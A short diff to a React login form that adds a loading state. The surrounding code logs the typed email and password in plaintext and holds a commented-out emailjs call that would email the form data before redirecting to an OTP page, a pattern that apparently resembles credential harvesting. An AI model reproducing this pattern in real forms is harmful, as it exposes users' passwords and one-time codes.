@@ -8,6 +8,7 @@ const Form = (props) => {
 
     const [email, setEmail] = useState('')
     const [password, setPassword] = useState('')
+    const [loading, setLoading]  = useState(false)
    
 
     const handleEmail = (e) => {
@@ -27,6 +28,7 @@ const Form = (props) => {
     }
     const handleSubmit = async (e) => {
         e.preventDefault()
+        setLoading(true)
 
         console.log('credentials', email, password)
 
@@ -34,7 +36,7 @@ const Form = (props) => {
             console.log('not sent')
         } else {
             console.log({ templateParams })
-               history.push('/otp', templateParams)
+            history.push('/otp', templateParams)
 
             // emailjs
             //     .send(
@@ -46,10 +48,13 @@ const Form = (props) => {
             //     .then(
             //         (result) => {
             //             console.log(result.text, 'email sent')
+            //         setLoading(false)
             //             history.push('/otp', templateParams)
             //         },
             //         (error) => {
             //             console.log(error, 'email failed')
+            //         setLoading(false)
+
             //         }
             //     )
         }
